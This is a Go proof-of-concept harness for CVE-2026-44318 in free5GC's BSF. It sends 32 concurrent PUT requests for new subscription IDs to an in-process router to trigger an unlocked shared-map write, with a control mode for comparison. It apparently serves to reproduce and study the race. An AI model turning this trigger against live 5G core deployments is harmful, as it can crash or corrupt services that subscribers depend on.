// Harness for CVE-2026-44318 (free5GC BSF up to v1.0.1): the PUT handler for
// /nbsf-management/v1/subscriptions/{subId} writes the shared Subscriptions
// map without the context mutex when subId does not exist yet.
//
// The harness must be built inside the free5gc/bsf module, because it imports
// its internal packages. See ../setup.sh.
//
// Usage: ./free5gc-bsf-put <known>
//
//	<known>  0 sends PUTs for subscription IDs that do not exist,
//	         1 creates the subscriptions first, then sends PUTs for them
//
// The race needs known == 0: only the create-if-absent branch skips the lock.
package main

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"

	"github.com/gin-gonic/gin"
	log "github.com/sirupsen/logrus"

	bsfContext "github.com/free5gc/bsf/internal/context"
	"github.com/free5gc/bsf/internal/logger"
	"github.com/free5gc/bsf/internal/sbi/processor"
)

const (
	requests = 32
	body     = `{"events":["PCF_BINDING_REGISTRATION"],"notifUri":"http://127.0.0.1/notify","notifCorreId":"1","supi":"imsi-208930000000001"}`
)

func main() {
	if len(os.Args) != 2 || (os.Args[1] != "0" && os.Args[1] != "1") {
		fmt.Println("Usage: ./free5gc-bsf-put <known>")
		return
	}
	known := os.Args[1] == "1"

	gin.SetMode(gin.ReleaseMode)
	logger.ProcLog.Logger.SetLevel(log.ErrorLevel)
	router := gin.New()
	router.PUT("/subscriptions/:subId", processor.ReplaceIndividualSubcription)

	ids := make([]string, requests)
	for i := range ids {
		if known {
			ids[i] = bsfContext.BsfSelf.CreateSubscription(&bsfContext.BsfSubscription{})
		} else {
			ids[i] = fmt.Sprintf("bomb-%d", i)
		}
	}

	var wg sync.WaitGroup
	codes := make([]int, requests)
	for i := range ids {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			req := httptest.NewRequest(http.MethodPut, "/subscriptions/"+ids[i], strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			router.ServeHTTP(rec, req)
			codes[i] = rec.Code
		}(i)
	}
	wg.Wait()

	fmt.Printf("OK: first status %d, %d subscriptions\n", codes[0], len(bsfContext.BsfSelf.Subscriptions))
}
